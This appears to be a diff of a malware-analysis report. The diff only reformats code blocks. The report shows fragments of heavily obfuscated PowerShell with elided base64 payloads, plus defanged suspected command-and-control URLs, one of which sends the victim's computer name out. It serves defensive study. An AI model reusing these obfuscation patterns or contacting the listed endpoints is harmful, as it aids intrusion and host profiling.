@@ -25,27 +25,27 @@ Two related commands were identified containing heavily obfuscated PowerShell. A
 
 The scripts used several layers of obfuscation, including arithmetic-based string generation, encoded payloads, compressed data blobs, and indirect execution with reflection. Snippets of these scripts are shown below.
 
-```
+<pre><code>
 $xtrvndwblhkco=$executioncontext;$atedatatedesantionisaraloralenes = (-joIn (@((-838+(6369-(3626436/(-2638+3300)))),(349908/6729),(7048-6991),(10121-(900+(2956+6215))),(-4013+(2422+(-6051+(9845-2147)))),(532+((5201+(786+3650))-(2137+2278))),(2922+(2573-(1475+1339))),(-5864+((9875+8932)-(4329+8423))),(-1996+((4710+(-784+2648))-(6350-3682))),(-5618+((7544+(7047-2510))-(2138+1659))),((1639+(3292+8043))-(5087+8771)),(4375/(2912+3064)),(9883-(2881+6900)),(3576+(-652+3974))),(112 + (8322 - 5406)),(-4209+(1092+(-3370+6338))),((8259-5850)+(6575-1883)),(-8787+(3680+(-4525+6980))),(-3309+(1217+(-4904+2088))),((7980-5129)+(4630-3491)),(4293-(6694-6160)),((3389+3554)-(2790+7140)),(-8537+(8097+(-4310+6205))),((9022-3662)+(1688+4492)),(9061-7743),(5141-(2875+5030)),(7180-(4720+6598)),(5854-(6469+8301)),(8639-(4619+2102)),(-4411+((7317+2646)-(2482+7661))),((7000-6321)+(1202+7579)),(4195-(4195+4859)),((5290+6256)-(3590+4238)),(7482-2631)),[byte[]]::ConvertFromBase64String((($vwds = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("..."))) )))
-```
+</code></pre>
 
-```
+<pre><code>
 [System.Text.Encoding]::ascii.(([char[]]@((4326-(25704455/(977+(6670-1606)))),(7200-7099),(219008/(7615-5727)),(2740-2657),(1147-1031),(8706-(6452592/(-5601+6352))),(778470/(32977472/(4294+154))),(-57+(6210+(-8012+(1145+7192)))),(18484/(2346+7526)),(2430-2329),(5440-(6190+1981)),(12513/(6466+1188)),(551+((3851+7020)-(1184+1994))),((8459-2300)+(2988+7129)),(27449/(9681-7792)),(-9195+(4952+(-6248+3377))),((7750-6192)+(7338-1127)),(5426-(3644+6046)),(5262-(2404+9191)),(4796-(1863+4555)),(9661-(7316+3776)),(-5530+((4108+3152)-(7929+2148))),((5972-3036)+(8325-2417)),(4652-(7254-1486)),(-4719+((6412+5483)-(4153+6940))),((5290+7255)-(2782+4257)),(-7689+(1017+(-6102+1818))),((8934-4179)+(6157-5080)),(9406-(5975+1298)),(3649-(1906+8798)),(2131-1970)),[SYSTEM.TEXT.ENCODING]::ASCII.GetBytes("..."))
-```
+</code></pre>
 
 ### Deobfuscation Results
 
 Analysis of the scripts identified communication with the following suspected command-and-control (C2) endpoint:
 
-```
+<pre><code>
 hxxps://urjmovmstbtkamj[.]top/1.php?s=527
-```
+</code></pre>
 
 A second request was also observed at:
 
-```
+<pre><code>
 hxxp://urjmovmstbtkamj[.]top/dfql2whrag.php?id=$env:computername&key=snrljndkqk&s=527
-```
+</code></pre>
 
 This second request appears to collect host information, including the computer name. The parameters may indicate the following:
 
